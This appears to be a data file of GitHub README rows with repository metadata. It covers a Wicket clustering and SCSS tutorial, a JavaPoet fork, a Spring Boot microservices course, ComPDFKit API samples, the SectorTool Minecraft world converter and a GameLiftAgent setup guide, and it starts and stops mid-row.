	});
}
```

With all configuration code in place we can start our application with the following command (assuming port 8083 is free on our machine).

```
SERVER_PORT=8083 mvn spring-boot:run
```

Taking a look at our application logs we can see a message from Hazelcast confirming that a new cluster has been created and the application has successfully joined it:

```
2024-06-13 11:39:30.169 [main] INFO  com.hazelcast.core.LifecycleService - [10.3.0.8]:5702 [dev] [5.3.6] [10.3.0.8]:5702 is STARTING
2024-06-13 11:39:32.835 [main] INFO  c.h.internal.cluster.ClusterService - [10.3.0.8]:5702 [dev] [5.3.6] 

Members {size:1, ver:1} [
	Member [10.3.0.8]:5702 - 9cf568db-8106-40d0-8463-6ca2d2082eb6 this
]
```

Once the application is up we can open our browser at [http://localhost:8083](http://localhost:8083) and check the given sessionId value. Now let's start a second instance of our application. We expect it tojoin the existing cluster and using the same shared web session. The application can be started with the same command seen above but using a different available port:

```
SERVER_PORT=8084 mvn spring-boot:run
```

Again, looking at the logs of both this new instance or the existing one we should see that the new one has joined the cluster:

```
2024-06-13 11:51:35.757 [hz.gallant_kapitsa.IO.thread-in-0] INFO  c.h.i.server.tcp.TcpServerConnection - [10.3.0.8]:5703 [dev] [5.3.6] Initialized new cluster connection between /10.3.0.8:43349 and /10.3.0.8:5702
2024-06-13 11:51:41.000 [hz.gallant_kapitsa.priority-generic-operation.thread-0] INFO  c.h.internal.cluster.ClusterService - [10.3.0.8]:5703 [dev] [5.3.6] 

Members {size:2, ver:2} [
	Member [10.3.0.8]:5702 - 9cf568db-8106-40d0-8463-6ca2d2082eb6
	Member [10.3.0.8]:5703 - bf396942-563d-4750-a0ba-0bac3e241fc8 this
]
```

Opening our browser at [http://localhost:8084](http://localhost:8084) we should have the confirm that the new instance is using the same session with the same id.
Feel free to play around stopping/restarting one of the two instances at a time to see that the session isn't lost as long as one instance is still active. 

## Style your application with SCSS

When it comes to web application styling, SCSS is a precious ally as it allows to use a more advanced syntax to manage and organize our css resources. Since SCSS needs to be converted in standard CSS language, we need a compiler to perform this task.

For developers it would be even better if this compiler could operate ""live"", automatically compiling SCSS sources as they are modified. Most of the time this time of compiler requires to use a dedicated external application or some kind of IDE extention to monitor our SCSS files and recompile them as they get modified. \
With Wicket we can use library _wicket-bootstrap-sass_ that offers an even more flexible solution in the form of [CSS resource](https://nightlies.apache.org/wicket/guide/10.x/single.html#_resource_management_with_wicket) that points to a SCSS file and compiles it on the fly, without depending on an external application.

> [!NOTE]
> Library _wicket-bootstrap-sass_ depends on OS library [libsass](https://github.com/sass/libsass), so be sure to have it already installed before running the following example code.

Example project _wicket-scss_ uses both library _wicket-bootstrap-sass_ and _WebJars_ to show how to easily customize Bootstrap 5 style using a SCSS file that extends the default _bootstrap.scss_ file distributed with WebJars dependency.

The project has the same dependencies seen for project _wicket-webjar_ in addition to module _wicket-bootstrap-sass_:

```xml
<dependency>
    <groupId>de.agilecoders.wicket.webjars</groupId>
    <artifactId>wicket-webjars</artifactId>
    <version>4.0.3</version>
</dependency>

<dependency>
    <groupId>de.agilecoders.wicket</groupId>
    <artifactId>wicket-bootstrap-sass</artifactId>
    <version>7.0.3</version>
</dependency>

<dependency>
    <groupId>org.webjars</groupId>
    <artifactId>bootstrap</artifactId>
    <version>5.3.3</version>
</dependency>
```

In our application's _init()_ method we initialize both WebJars and SASS integration: 

```java
@Override
public void init()
{
    super.init();

   
    // init wicket WebJars and SASS library
    WicketWebjars.install(this);
    BootstrapSass.install(this);
}
```

Next, let's have a look at the file _custom-css.scss_ we will use to customize our Boostrap 5 based theme:

```scss
//SCSS VARIABLE OVERRIDING
$primary: #397EB4;
$warning: #f19027;
$min-contrast-ratio: 3;


//INCLUDING MAIN BOOTSTRAP SCSSS
@import ""webjars!bootstrap/current/scss/bootstrap.scss"";
```

The file has a starting section where we override some of the Bootstrap variables (see [official documentation](https://getbootstrap.com/docs/5.0/customize/sass/#modify-map)) to customize colors for primary and warning buttons. \
The last line imports the main Bootstrap 5.3.3 SCSS which is loaded from the corresponding WebJar using the syntax _webjars!<path_to_file>_

Finally, our file _custom-css.scss_ can be used as regular Wicket CSS header item using class _SassResourceReference_ that takes care of compilation behind the scenes:

```java
protected final CssReferenceHeaderItem customCss = 
    CssHeaderItem.forReference(new SassResourceReference(HomePage.class, ""custom-css.scss""));

@Override
public void renderHead(IHeaderResponse response) {
    response.render(customCss);
}
```

Once the application is started (with the usual command `mvn jetty:run`.) you can play around modifying file _custom-css.scss_ and see changes in real time.
",0,0,1,0.0,"['modern', 'web', 'development', 'apache', 'wicket', 'spring', 'boot', 'hazelcast', 'webjars', 'produce', 'url', 'page', 'mount', 'remove', 'page', 'id', 'url', 'manage', 'cs', 'javascript', 'libraries', 'webjars', 'maven', 'use', 'spring', 'boot', 'hazelcast', 'scale', 'application', 'session', 'cluster', 'cache', 'style', 'application', 'scss']","['spring', 'boot', 'hazelcast', 'webjars', 'url']",3.0,"[org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-war-plugin,org.eclipse.jetty:jetty-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",3.0,0.0,0.0
Randgalt/java-composer,master,"[![Maven Build](https://github.com/Randgalt/java-composer/actions/workflows/ci.yml/badge.svg)](https://github.com/Randgalt/java-composer/actions/workflows/ci.yml)
[![Maven Central](https://img.shields.io/maven-central/v/io.soabase.java-composer/java-composer.svg?sort=date)](https://search.maven.org/search?q=g:io.soabase.java-composer%20a:java-composer)

# Java Composer

This is a soft-fork of [JavaPoet](https://github.com/square/javapoet). JavaPoet appears to have been abandoned and is missing 
support for post-Java 8 features. This repository exists solely to add those missing features until a time when JavaPoet 
chooses to reactivate.

Please see [JavaPoet](https://github.com/square/javapoet) for documentation, licensing, etc.

```xml
    <groupId>io.soabase.java-composer</groupId>
    <artifactId>java-composer</artifactId>
    <version>VERSION</version>
```

# Changes From JavaPoet

### March 26, 2024
- Require Java 17
- Add record support from https://github.com/square/javapoet/pull/981
- Support sealed/non-sealed/permits
",1,5,1,15.0,"['java', 'composer', 'change', 'from', 'javapoet', 'march']","['java', 'composer', 'change', 'from', 'javapoet']",1.0,"[maven-gpg-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-deploy-plugin,org.apache.maven.plugins:maven-gpg-plugin,org.apache.maven.plugins:maven-install-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-javadoc-plugin,org.apache.maven.plugins:maven-release-plugin,org.apache.maven.plugins:maven-source-plugin,org.apache.maven.plugins:maven-surefire-plugin]",0.0,1.0,0.0
sivaprasadreddy/spring-boot-microservices-course,main,"# Spring Boot Microservices Course
This repository contains the source code for the [Spring Boot Microservices Course](https://www.youtube.com/playlist?list=PLuNxlOYbv61g_ytin-wgkecfWDKVCEDmB).

![Spring Boot Microservices course](docs/youtube-thumbnail.png)

We will build a BookStore application using Spring Boot, Spring Cloud, and Docker.

![BookStore Microservices Architecture](docs/bookstore-spring-microservices.png)

## Modules
* **catalog-service**: 
  This services provides REST API for managing catalog of products(books).
  
  **TechStack:** Spring Boot, Spring Data JPA, PostgreSQL

* **order-service**: 
  This service provides the REST API for managing orders and publishes order events to the message broker.

  **TechStack:** Spring Boot, Spring Security OAuth2, Keycloak, Spring Data JPA, PostgreSQL, RabbitMQ

* **notification-service**: 
  This service listens to the order events and sends notifications to the users.
  
  **TechStack:** Spring Boot, RabbitMQ

* **api-gateway**: 
  This service is an API Gateway to the internal backend services (catalog-service, order-service).

  **TechStack:** Spring Boot, Spring Cloud Gateway

* **bookstore-webapp**: 
  This is the customer facing web application where customers can browse the catalog, place orders, and view their order details. 

  **TechStack:** Spring Boot, Spring Security OAuth2, Keycloak, Thymeleaf, Alpine.js, Bootstrap

## Learning Objectives
* Building Spring Boot REST APIs
* Database Persistence using Spring Data JPA, Postgres, Flyway
* Event Driven Async Communication using RabbitMQ
* Implementing OAuth2-based Security using Spring Security and Keycloak
* Implementing API Gateway using Spring Cloud Gateway
* Implementing Resiliency using Resilience4j
* Job Scheduling with ShedLock-based distributed Locking
* Using RestClient, Declarative HTTP Interfaces to invoke other APIs
* Creating Aggregated Swagger Documentation at API Gateway
* Local Development Setup using Docker, Docker Compose and Testcontainers
* Testing using JUnit 5, RestAssured, Testcontainers, Awaitility, WireMock
* Building Web Application using Thymeleaf, Alpine.js, Bootstrap
* Monitoring & Observability using Grafana, Prometheus, Loki, Tempo (Membership)
* Kubernetes Basics (Membership)
* Deployment to Kubernetes (Membership)

## Local Development Setup
* Install Java 21. Recommend using [SDKMAN](https://sdkman.io/) for [managing Java versions](https://youtu.be/ZywEiw3EO8A).
* Install [Docker Desktop](https://www.docker.com/products/docker-desktop/)
* Install [IntelliJ IDEA](https://www.jetbrains.com/idea) or any of your favorite IDE
* Install [Postman](https://www.postman.com/) or any REST Client

## Other Learning Resources
* [SivaLabs Blog](https://sivalabs.in)
  * [Spring Boot Tutorials](https://www.sivalabs.in/spring-boot-tutorials/)
  * [Kubernetes Tutorials](https://www.sivalabs.in/getting-started-with-kubernetes/)
  * [Spring Security OAuth 2.0 Tutorials](https://www.sivalabs.in/spring-security-oauth2-tutorial-introduction/)
  * [A Pragmatic Approach to Software Design](https://www.sivalabs.in/tomato-architecture-pragmatic-approach-to-software-design/)
* [SivaLabs YouTube Channel](https://www.youtube.com/c/SivaLabs)
  * [Spring Boot Tips Series](https://www.youtube.com/playlist?list=PLuNxlOYbv61jFFX2ARQKnBgkMF6DvEEic)
  * [Spring Boot + Kubernetes Series](https://www.youtube.com/playlist?list=PLuNxlOYbv61h66_QlcjCEkVAj6RdeplJJ)
  * [Spring Boot : The Missing Guide](https://www.youtube.com/playlist?list=PLuNxlOYbv61jZL1IiciTgWezZoqEp4WXh)
  * [Java Testing Made Easy: Learn writing Unit, Integration, E2E & Performance Tests](https://www.youtube.com/playlist?list=PLuNxlOYbv61jtHHFHBOc9N7Dg5jn013ix)
",0,2,8,11.0,"['spring', 'boot', 'microservices', 'course', 'module', 'learn', 'objective', 'local', 'development', 'setup', 'other', 'learning', 'resource']","['spring', 'boot', 'microservices', 'course', 'module']",6.0,"[com.diffplug.spotless:spotless-maven-plugin,io.github.git-commit-id:git-commit-id-maven-plugin,org.springframework.boot:spring-boot-maven-plugin]",0.0,5.0,1.0
ComPDFKit/compdfkit-api-samples,main,"## ComPDFKit PDF API

[ComPDFKit PDF API](https://api.compdf.com/) is organized around the REST standard and provides you with a simple document-upload, document-process, document-download workflow. Supporting various programming languages (such as [Java](https://api.compdf.com/api-libraries/in-java), [Python](https://api.compdf.com/api-libraries/in-python), [C#](https://api.compdf.com/api-libraries/in-net), [PHP](https://api.compdf.com/api-libraries/in-php), [Swift](https://api.compdf.com/api-libraries/in-swift), JavaScript, etc.), ComPDFKit API offers rich PDF functionalities, including conversion, document editor, data extraction, and so forth. 

Before integrating the below PDF capabilities, you can register a free [ComPDFKit API](https://api.compdf.com/signup) account to process 1,000 files per month without costs and limitations. 

| [PDF to Word](https://api.compdf.com/api-reference/pdf-to-word) | [PDF to Excel](https://api.compdf.com/api-reference/pdf-to-excel) | **[PDF to PPT](https://api.compdf.com/api-reference/pdf-to-ppt)** | [PDF to HTML](https://api.compdf.com/api-reference/pdf-to-html) |
| :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- | :----------------------------------------------------------- |
| [PDF to RTF](https://api.compdf.com/api-reference/pdf-to-rtf) | [PDF To Image](https://api.compdf.com/api-reference/pdf-to-image) | [PDF to CSV](https://api.compdf.com/api-reference/pdf-to-csv) | [PDF to TXT](https://api.compdf.com/api-reference/pdf-to-txt) |
| [Data Extraction](https://api.compdf.com/api-reference/pdf-to-json) | [PDF to Editable PDF](https://api.compdf.com/api-reference/pdf-to-editable-pdf-tool-guide) | [Image to Word](https://api.compdf.com/api-reference/image-to-word) | [Image to Excel](https://api.compdf.com/api-reference/image-to-excel) |
| [Image to PPT](https://api.compdf.com/api-reference/image-to-ppt) | [Image to HTML](https://api.compdf.com/api-reference/image-to-html) | [Image to RTF](https://api.compdf.com/api-reference/image-to-rtf) | [Image to CSV](https://api.compdf.com/api-reference/image-to-csv) |
| [Image to TXT](https://api.compdf.com/api-reference/image-to-txt) | [Word to PDF](https://api.compdf.com/api-reference/word-to-pdf) | [Excel to PDF](https://api.compdf.com/api-reference/excel-to-pdf) | [PPT to PDF](https://api.compdf.com/api-reference/ppt-to-pdf) |
| [HTML to PDF](https://api.compdf.com/api-reference/html-to-pdf) | [RTF to PDF](https://api.compdf.com/api-reference/rtf-to-pdf) | [PNG to PDF](https://api.compdf.com/api-reference/image-to-pdf) | [CSV to PDF](https://api.compdf.com/api-reference/csv-to-pdf) |
| [TXT to PDF](https://api.compdf.com/api-reference/txt-to-pdf) | [Merge PDF](https://api.compdf.com/api-reference/merge)      | [Split PDF](https://api.compdf.com/api-reference/split)      | [Rotate PDF](https://api.compdf.com/api-reference/rotate)    |
| [Delete PDF](https://api.compdf.com/api-reference/delete)    | [Insert PDF](https://api.compdf.com/api-reference/insert)    | [Extract PDF](https://api.compdf.com/api-reference/extract)  | [Compare PDF](https://api.compdf.com/api-reference/compare-documents) |
| [OCR](https://api.compdf.com/api-reference/ocr)              | [Layout Analysis](https://api.compdf.com/api-reference/layout-analysis) | [Image Sharpening Enhancement](https://api.compdf.com/api-reference/image-processing) | [Form Recognizer](https://api.compdf.com/api-reference/form-recognizer) |
| [Trim Correction](https://api.compdf.com/api-reference/trim-correction) | [Stamp Inspection](https://api.compdf.com/api-reference/stamp-inspection) | [Add Watermark](https://api.compdf.com/api-reference/watermark-guides) | [Compression PDF](https://api.compdf.com/api-reference/compress-guides) |



## Getting Started with Code Samples

This GitHub repository provides public access to code examples that demonstrate how to programmatically submit requests to the [ComPDFKit API](https://api.compdf.com/) service.

Before you begin, you may need to do some preparatory work.

- [Register](https://api.compdf.com/signup) a free ComPDFKit API account using email only.
- Obtain the project ID and its related key from the [API Keys](https://api-dashboard.compdf.com/api/keys) section of the console.
- To start requesting the ComPDFKit API, please read the comprehensive [API reference](https://api.compdf.com/api-reference/overview) for the function you need to call.



## Instructions for Running Code Demo

### Authentication

You can get **accessToken** and related verification information by sending your **publicKey** and  **SecretKey** . AccessToken will expire after **12** hours. **When calling the subsequent interface, you must carry this token in the request header**: `Authorization: Bearer {accessToken}`.

Before running each sample program, look for a comment that reads:

> `public_key_******`
>
> ` secret_key_******`

and replace `******` with your API Keys.

### Create task

A task ID is automatically generated for you based on the type of PDF tool you choose. You can provide the callback notification URL. After the task processing is completed, we will notify you of the task result through the callback interface. You can perform other operations according to the task result, such as downloading the result file.

### Upload files

Upload the original file and bind the file to the task ID. The field **parameter** is used to pass the JSON string to set the processing parameters for the file. Each file will generate automatically a unique **filekey**. 

Please note that a maximum of five files can be uploaded for a task ID and no files can be uploaded for that task after it has started.

### Execute task and get task information

After the file is uploaded, the file processing starts and the download link of the corresponding result file is obtained according to the **filekey** of each file



## API Documentation

After you've successfully sent an API Call using these examples, take a look at the [Documentation](https://api.compdf.com/api-reference/overview) for each API endpoint for a full description of parameters you can adjust to customize your solution.



## Support

ComPDFKit has a professional R&D team that produces comprehensive technical documentation and guides to help developers. Also, you can get an immediate response when reporting your problems to our support team.

- For detailed information, please visit our [API Reference](https://api.compdf.com/api-reference/overview) page.
- Stay updated with the latest improvements through our [Changelog](https://www.compdf.com/api/changelog-compdfkit-api).
- For technical assistance, please reach out to our [Technical Support](https://www.compdf.com/support).
- To get more details and an accurate quote, please contact our [Sales Team](https://api.compdf.com/contact-us).



## Related

- Convert PDF to/ from other formats using [PDF online tools](https://www.compdf.com/pdf-tools)
- [Convert PDF to Image (JPG, PNG) with ComPDFKit API and Java](https://www.compdf.com/blog/convert-pdf-to-image-in-java-compdfkit-api)
- [Convert Excel to PDF Using Java - Free PDF Converter API](https://www.compdf.com/blog/convert-excel-to-pdf-using-java-api)
- Experience [ComPDFKit Web Demo](https://www.compdf.com/webviewer/demo) on any browser",0,0,1,0.0,"['compdfkit', 'pdf', 'api', 'get', 'start', 'code', 'sample', 'instruction', 'run', 'code', 'demo', 'authentication', 'create', 'task', 'upload', 'file', 'execute', 'task', 'get', 'task', 'information', 'api', 'documentation', 'support', 'related']","['task', 'api', 'get', 'code', 'compdfkit']",1.0,[],0.0,1.0,0.0
PaperMC/SectorTool,master,"# SectorTool

SectorTool primarily performs conversion and deconversion of worlds from/to
the SectorFile format. It can also perform benchmarks or other analysis of
RegionFiles.

It's highly recommended to only use this tool on **COPIES** of worlds.

The test branch does not contain any conversion code, you **MUST** use this tool
to convert.

This tool does not attempt to fix errors in RegionFiles. Make sure your world
has no errors in your RegionFiles before converting.

SectorTool can perform one of these operations:
1. [Convert to SectorFile](#conversion-to-sectorfile-from-regionfile)
2. [Deconvert from SectorFile](#conversion-from-sectorfile-to-regionfile-deconversion)
3. [Verify consistency from RegionFile to SectorFile](#verification-test)
4. [Perform compression tests on RegionFiles](#compression-test)
5. [Read results from compression tests](#read-compression-test)
6. [Analyse sector allocation for RegionFiles](#analyse-regionfiles)

See [the specification](SPECIFICATION.MD) for exact details on the SectorFile
format.

## World Layout

Described are the folder layouts of world data in Vanilla and Bukkit.

### Vanilla

Vanilla has the overworld under the `world` directory, with its data being placed
directly in the `world` folder. The nether's data is placed under `world/DIM-1`,
the end's data is placed under `world/DIM1`.

### Bukkit (Spigot/Paper/Folia)

If you run Bukkit, Spigot, Paper, or Folia your worlds are formatted in the ""Bukkit""
layout. The Bukkit layout places the overworld in the `world` folder in the root
server directory. The nether is placed in the `world_nether` folder in the root
server directory, however its data (excluding level.dat and friends) is placed
under `world_nether/DIM-1`, similar to how Vanilla would store under `world/DIM-1`.
The end is placed in the `world_the_end` folder in the root server directory, 
with its data being stored in `world_the_end/DIM1`.

### Changes

Instead of data being stored under `entities`, `poi`, and `region` data will
only be stored under the `sectors` directory. SectorFiles contain entities, 
poi, and region data under one SectorFile rather than multiple RegionFiles.

## Primary Usages

### Conversion to SectorFile from RegionFile

Converts a single world to the SectorFile format. The old RegionFiles
will not be deleted (folders: entities, poi, region), it is recommended 
that you move them after conversion. By moving the old data once you have
converted, it will be easier to convert back to RegionFile.

#### Behavior for already converted worlds

Additionally, there are no checks in-place to detect worlds already converted. 
Conversion will simply write the data found in the RegionFiles to the SectorFiles,
so if the SectorFiles have additional data for chunks not present in the original
RegionFiles they will be unaffected - but the chunks present in the RegionFiles
will be copied.

If you do not want this merging behavior then delete the `sectors` folder.

#### Command and options

```shell
java -Dop=conv \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Dcompress=<compress type id> \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the 
root world directory. For Bukkit worlds, you will want to run the tool for 
each dimension, using the root world directory as input (i.e. point to 
`world`, `world_nether`, and `world_the_end`) for each dimension.

#### compress

The compression type to use on the new SectorFiles. Values:
* GZIP (id = 1)
* DEFLATE (id = 2)
* NONE (id = 3)
* LZ4 (id = 4)
* ZSTD (id = 5)
* COPY (id = -1)

DEFLATE (id = 2) is the current default. LZ4 (id = 4) is fast but not space 
efficient. ZSTD (id = 5) is fast and slightly less space efficient than DEFLATE.

The COPY compression type will copy the compressed data from the source 
RegionFiles. Note that the COPY compression type will not perform 
decompression/recompression, unlike the rest of the compression options, 
which should greatly reduce CPU load.


### Conversion from SectorFile to RegionFile (Deconversion)

Converts a world from SectorFile format back to RegionFile format. It is 
highly recommended that you ensure that no RegionFiles are in the current world
(just move them to a separate directory), as the original conversion process from
RegionFile to SectorFile done by this tool **WILL NOT** delete RegionFiles. Note 
that the converted SectorFiles will not be deleted, you will need to do that.

#### Command and options

```shell
java -Dop=deconv \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Dcompress=<compress type id> \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the
root world directory. For Bukkit worlds, you will want to run the tool for
each dimension, using the root world directory as input (i.e. point to
`world`, `world_nether`, and `world_the_end`) for each dimension.

#### compress

The compression type to use on the RegionFiles. Values:
* GZIP (id = 1)
* DEFLATE (id = 2)
* NONE (id = 3)
* LZ4 (id = 4)

DEFLATE (id = 2) is the current default for Vanilla. LZ4 (id = 4) is 
**NOT** supported outside the latest snapshot, so do **NOT** use LZ4 
unless it is **FOR** snapshot worlds.

Note that ZSTD is not present because Vanilla RegionFile does not support ZSTD.

### Verification Test

Verifies that all data contained in the RegionFiles are contained in
the SectorFiles. This will not detect extra data in the SectorFiles.

#### Command and options

```shell
java -Dop=verify \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Dcompress=<compress type id> \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the
root world directory. For Bukkit worlds, you will want to run the tool for
each dimension, using the root world directory as input (i.e. point to
`world`, `world_nether`, and `world_the_end`) for each dimension.

#### compress (required but unused, pick one)

Values:
* GZIP (id = 1)
* DEFLATE (id = 2)
* NONE (id = 3)
* LZ4 (id = 4)
* ZSTD (id = 5)

## Secondary Usages

### Compression Test

Performs compression tests (time to decompress, compress, and resulting 
compression ratios) and store the results in a file which may be later 
used by the [Compression Read](#read-compression-test) operation.

```shell
java -Dop=test \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -Doutput=""<output>"" \
 -Dmax_regions=<max regions> \
 -jar sectortool.jar
```

#### input

Input directory of RegionFiles to run tests on. This is not a world directory,
it is a directory containing `.mca` files.

#### output

File to store test results in. This file should not exist, the tool will exit
if it does.

#### max_regions (optional)

The maximum number of RegionFiles to test on. Defaults to infinity.

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.


### Read Compression Test

Reads result file from a compression test, converting the data to some 
summary stats printed to stdout as well as converting the results to raw data
printed to `results.psv` in the working directory.


```shell
java -Dop=read \
 -Dinput=""<input>"" \
 -jar sectortool.jar
```

#### input

Results file generated by the compression test.

### Analyse RegionFiles

Computes the total number of 4096 byte sectors used by RegionFiles on disk 
(""file sectors""), the number of 4096 byte sectors allocated to live data by 
RegionFiles on disk (""allocated sectors""), the theoretical number of 512 byte 
sectors allocated (""alternate allocated sectors""), the total size of compressed 
data in bytes (""total data size""), and the number of obvious (header offsets/length
are invalid or point outside of file) errors in RegionFile headers (""errors"").

Computing `allocated sectors / file sectors` gives some indication of RegionFile
fragmentation.

Computing `allocated sectors / alternate allocated sectors * (4096/512)` gives
some indication of the improvements expected to come by using SectorFile.

#### Command and options

```shell
java -Dop=analyse \
 -Dthreads=<threads> \
 -Dinput=""<input>"" \
 -jar sectortool.jar
```

#### threads (optional)

Specified number of threads to use. Use 1 for HDDs, use larger amounts
for SSDs. Defaults to 1/2 of available processors.

#### input

Input root world directory. For Vanilla worlds, this is plainly just the
root world directory. For Bukkit worlds, you will want to run the tool for
each dimension, using the root world directory as input (i.e. point to
`world`, `world_nether`, and `world_the_end`) for each dimension.",4,1,1,0.0,"['sectortool', 'world', 'layout', 'vanilla', 'bukkit', 'change', 'primary', 'usage', 'conversion', 'sectorfile', 'regionfile', 'behavior', 'already', 'convert', 'world', 'command', 'option', 'thread', 'optional', 'input', 'compress', 'conversion', 'sectorfile', 'regionfile', 'deconversion', 'command', 'option', 'thread', 'optional', 'input', 'compress', 'verification', 'test', 'command', 'option', 'thread', 'optional', 'input', 'compress', 'require', 'unused', 'pick', 'one', 'secondary', 'usage', 'compression', 'test', 'input', 'output', 'optional', 'thread', 'optional', 'read', 'compression', 'test', 'input', 'analyse', 'regionfiles', 'command', 'option', 'thread', 'optional', 'input']","['optional', 'input', 'thread', 'command', 'option']",2.0,"[maven-compiler-plugin,maven-jar-plugin,maven-shade-plugin,org.apache.maven.plugins:maven-compiler-plugin,org.apache.maven.plugins:maven-jar-plugin,org.apache.maven.plugins:maven-shade-plugin]",0.0,2.0,0.0
aws/amazon-gamelift-agent,main,"## GameLiftAgent
GameLiftAgent is a Java application that is used to launch game server processes on Amazon GameLift fleets.

This application registers a compute resource for an existing Amazon GameLift fleet using the RegisterCompute
API. The application also calls the GetComputeAuthToken API to fetch an authorization token for the compute resource,
using it to make a web socket connection to the Amazon GameLift service.

## Quick Start
### JDK Version
GameLiftAgent was built with Java 17 and will require (at least) this version to compile.
Check the java version.
```
java -version
```
If the java version is not showing Java 17, then you will have to install Java 17.

### Build the GameLiftAgent using Maven
The GameLiftAgent requires a minimum version of 3.2.5. for Maven to run.
Check your maven version with the command:
```
mvn -version
```

If the Maven version is less than version 3.2.5, you will have to update the Maven version to be at least version 3.2.5.

1. Navigate to the GameLiftAgent package root (directory including `pom.xml` file)
2. Execute the following to download dependencies, compile the project and generate a standalone jar using Maven:
```
mvn clean compile assembly:single
```
If this successfully compiles, then GameLiftAgent-1.0.jar will become available in the following path:

```
ls ./target/GameLiftAgent-1.0.jar
```

### Before running the application/jar
Make sure you have an active Anywhere fleet and an active compute for the fleet before running the JAR.
The LaunchPath for the Server Process should be the in the same location as a game build executable or
Realtime Servers script. Use the following commands to perform the setup:

1. Copy the GameLiftAgent-1.0.jar to the directory (Example: /local/game or C:\game\).
#### Linux
```
cp ./target/GameLiftAgent-1.0.jar /local/game
```

#### Powershell
```
Copy-Item -Path .\target\GameLiftAgent-1.0.jar -Destination C:\game\
```

2. Then move the game executable to the same directory (/local/game).
#### Linux
```
cp [GAME_EXECUTABLE] /local/game
```

#### Powershell
```
Copy-Item -Path [GAME_EXECUTABLE] -Destination C:\game\
```

3. Grant read and execute permissions to run the JAR and the game executable.
#### Linux
```
sudo chmod 755 /local/game/GameLiftAgent-1.0.jar
sudo chmod 755 /local/game/[GAME_EXECUTABLE]
```

### Run the application/jar
Use the following instructions to run the application:
1. The standalone jar will be located in `./target/` and can be launched with a command such as the following
(There are some example launch commands listed at the end):
```
java -jar ./target/GameLiftAgent-1.0.jar <Command Line Options>
```

### Command Line Options
1. `certificate-path` / `cp`
    1. Optional - path to TLS certificate on compute resource. The path and certificate are not validated by Amazon GameLift.
1. `compute-name` / `c`
    1. Required - A descriptive label that is associated with the compute resource registered to your fleet.
    1. May also be provided using environment variable `GAMELIFT_COMPUTE_NAME` instead of specifying as a command line option.
    1. For managed Amazon GameLift, this is set by Amazon GameLift to environment variable `GAMELIFT_COMPUTE_NAME`.  No command line option required.
1. `dns-name` / `dns`
    1. Optional - The DNS name of the compute resource. (this option is not yet available)
    1. This option is used with Amazon GameLift Anywhere fleets only. Either `dns-name` or `ip-address` is required.
1. `fleet-id` / `f`
    1. Required - A unique identifier for the GameLift fleet on which the compute resource will be registered.
    1. May also be provided via environment variable `GAMELIFT_FLEET_ID` instead of specifying as a command line option.
    1. For managed Amazon GameLift, this is set by Amazon GameLift to environment variable `GAMELIFT_FLEET_ID`. No command line option required.
1. `gamelift-endpoint-override` / `gleo`
    1. Optional - For internal testing purposes. Using this option will likely result in errors.
1. `gamelift-credentials` / `glc`
    1. Optional - The source of credentials, which are used by the Amazon GameLift client make the `RegisterCompute` and `GetComputeAuthToken` API calls.
    1. Options are as follows (default is `instance-profile`):
        1. `instance-profile` - Uses credentials from the IAM profile associated with the Amazon GameLift EC2 fleet instance.
        1. `container` - Uses credentials from an ECS container IAM profile.
        1. `environment-variable` - Uses temporary IAM role credentials exported to environment variables.
1. `game-session-log-bucket` / `gslb`
    1. Optional - The name of an Amazon S3 bucket in the AWS account to upload game session logs.
    1. Using this option requires Amazon GameLift fleets to specify an `InstanceRoleArn`. The IAM role must include `s3:PutObject` permission.
    1. Using this option results in `InstanceRoleArn` credentials being fetched and cached via the web socket `GetFleetRoleCredentials` route.
1. `ip-address` / `ip`
    1. Optional - The IP address of the compute resource.
    1. This option is used with Amazon GameLift Anywhere fleets only. Either `dns-name` or `ip-address` is required.
1. `location` / `loc`
    1. Optional -  The location where the compute resource resides.
    1. Required for Amazon GameLift Anywhere fleets. Must match the custom location registered on the fleet.
    1. For Amazon GameLift EC2 fleets, this option is set by Amazon GameLift to environment variable `GAMELIFT_REGION`. No command line option required.
1. `gamelift-agent-log-bucket` / `galb`
    1. Optional - The name of an Amazon S3 bucket in the AWS account to upload logs for GameLiftAgent.
    1. Using this option requires Amazon GameLift fleets to specify an `InstanceRoleArn`. The IAM role must include `s3:PutObject` permission.
    1. Using this option results in `InstanceRoleArn` credentials being fetched and cached via the web socket `GetFleetRoleCredentials` route.
1. `gamelift-agent-log-path` / `galp`
    1. Optional - The file path where GameLiftAgent logs are stored locally. During launch, parent directories are created as required for this path.
    1. Defaults are `/local/gameliftagent/logs` for Linux and `C:\\GameLiftAgent\\Logs\\` for Windows.
1. `region` / `r`
    1. Required - The AWS region used when creating GameLift fleets.
    1. May also be provided using environment variable `GAMELIFT_REGION` instead of specifying as a command line option.
    1. For managed Amazon GameLift, this is set by Amazon GameLift to environment variable `GAMELIFT_REGION`. No command line option required.
1. `runtime-configuration` / `rc`
    1. Optional - A static RuntimeConfiguration provided as inline JSON.
    1. For managed Amazon GameLift Fleets, RuntimeConfiguration should set when creating or updating an Amazon GameLift fleet. No command line option required.

### Example Launch Commands - Managed GameLift

#### Linux

```
java -jar /<path>/<to>/GameLiftAgent-1.0.jar \
  -c '<compute-name>' \
  -f '<fleet id>' \
  -loc 'custom-<custom location name>' \
  -r '<region name>' \
  -glc environment-variable \
  -gslb 'gameliftgamesessionlogS3bucketname' \
  -galb 'gameliftagentlogS3bucketname' \
  -galp '/local/gameliftagent/logs/'
```

#### Windows

```
